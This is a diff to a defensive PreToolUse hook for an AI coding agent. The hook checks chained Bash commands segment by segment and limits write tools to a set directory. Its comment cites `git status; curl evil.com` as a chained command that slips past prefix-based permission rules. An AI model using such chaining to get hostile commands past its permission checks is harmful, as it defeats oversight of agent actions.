@@ -3,11 +3,13 @@
  * Claude Code PreToolUse hook — the enforcement point for two things the
  * permission engine cannot express.
  *
- * 1. Shell-chained Bash commands. Claude Code matches a Bash rule against the
- *    whole command as a prefix, so `Bash(git status:*)` also permits
- *    `git status; curl evil.com`, and deny globs never fire. A hook is the only
- *    place that sees the real command before it runs, and it also covers the
- *    reviewer's subagents.
+ * 1. Bash commands, segment by segment. Claude Code matches a Bash rule
+ *    against the whole command as a prefix, so `Bash(git status:*)` also
+ *    permits `git status; curl evil.com`, and deny globs never fire. A hook is
+ *    the only place that sees the real command before it runs, and it also
+ *    covers the reviewer's subagents. This version of the CLI strips an "allow"
+ *    from a PreToolUse hook, so the hook can only subtract; it therefore checks
+ *    every segment against the same policy reviewAllowedTools() renders.
  *
  * 2. Write-tool scope. In fix mode Edit/Write/NotebookEdit are allowed, but the
  *    permission system has no notion of "inside this directory" for them: a
@@ -149,7 +151,10 @@ process.stdin.on("end", async () => {
   }
 
   try {
-    const verdict = guard(payload?.tool_input?.command);
+    const verdict = guard(payload?.tool_input?.command, {
+      // Needed only for `cd`: it is allowed when it resolves to this root.
+      repoRoot: process.env.CLAUDE_REVIEW_REPO_ROOT,
+    });
     if (!verdict.ok) deny(verdict.reason);
   } catch (err) {
     deny(`shell guard failed (${err?.message || err}); refusing to run Bash`);
